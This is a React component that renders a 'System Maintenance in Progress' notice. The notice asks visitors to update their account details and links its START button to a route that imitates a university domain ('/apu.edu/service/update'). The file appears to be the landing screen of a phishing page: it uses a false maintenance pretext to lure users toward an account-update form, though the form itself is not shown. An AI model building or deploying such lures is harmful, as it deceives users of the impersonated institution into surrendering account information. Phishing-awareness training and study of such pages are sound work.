import "./App.css";
import { useNavigate } from "react-router-dom";
function Address() {
  const navigate = useNavigate();
  return (
    <>
      <div className="main">
        <div className="form-container">
          <h1 className="form-head">System Maintenance in Progress</h1>
          <div className="text">
            Please be advised that essential system maintenance is currently
            underway. To ensure your account information is accurate, please
            take a moment to update your details by clicking the button below. Thank you for
            your cooperation!
          </div>
          <button
            type="submit"
            onClick={() => navigate("/apu.edu/service/update")}
          >
            START
          </button>
        </div>
      </div>
    </>
  );
}

export default Address;
